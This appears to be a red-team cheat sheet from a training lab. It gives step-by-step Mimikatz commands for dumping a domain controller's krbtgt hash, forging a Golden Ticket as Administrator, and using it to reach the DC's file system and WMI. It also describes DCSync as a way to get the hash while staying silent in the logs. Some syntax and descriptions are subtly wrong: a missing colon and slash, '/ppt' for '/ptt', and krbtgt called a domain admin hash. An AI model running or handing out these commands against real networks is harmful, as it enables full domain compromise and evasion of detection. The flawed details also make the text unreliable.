
# Golden Ticket - Creating golden ticket with krbtgt

1. After dumping all hashes on Domain Controller, take note of the domain admin hash (KRBTGT)
```powershell
Invoke-Mimikatz -Command '"lsadump:lsa /patch"' -Computername corp-dc

#User : krbtgt
#LM   :
#NTLM : ff46a9d8bd66c6efd77603da26796f35
```

2. Using KRBTGT we can create a golden ticket


```powershell
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'


```

3. Using the Golden Ticket

```powershell
#check ticket
klist

#accessing filesystem on domain controller
ls \\dcorp-dc.dollarcorp.moneycorp.local\c$

#we can also run WMI commands on the DC
gwmi -Class win32_computersystem -ComputerName dcorp-dc.dollarcorp.moneycorp.local

#Domain              : dollarcorp.moneycorp.local
#Manufacturer        : Microsoft Corporation
#Model               : Virtual Machine
#Name                : DCORP-DC
#PrimaryOwnerName    : Windows User
#TotalPhysicalMemory : 2147012608
```


## Command breakdown

| Invoke-Mimikatz -Command |	|
| ---	| --- |
| kerberos::golden | Name of the module |
| /domain:dollarcorp.moneycorp.local | Domain FQDN |
| /sid:S-1-5-21-1874506631-3219952063-538504511| SID of the domain |
| /krbtgt:ff46a9d8bd66c6efd77603da26796f35 | NTLM (RC4) hash of the KRBTGT account. Use /aes128 and /aes256 for using AES keys|
| /id:500 /groups:512 | optional User RID (default 500) and group default 513 512 520 518 519 |
| /ppt or /ticket | (ppt) Injects ticket in current powershell process - no need to save the ticket on disk. (ticket) Saves the ticket to a file for later use |
| /startoffset:0 | Optional when ticket is available (default 0 - right now) in minutes. Use negative value for a ticket to be available from past and a larger number for future |
| /endin:60 | optional lifetime (default is 10years) in minutes. Default AD setting is 10 hours = 600mins |
| /renewmax:10080 | optional ticket lifetime with renewal (default is 10 years) in minutes. The default AD setting is 7 days = 10080 |


## Alternatively, use DCSync to get KRBTGT

Silent in the logs

```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

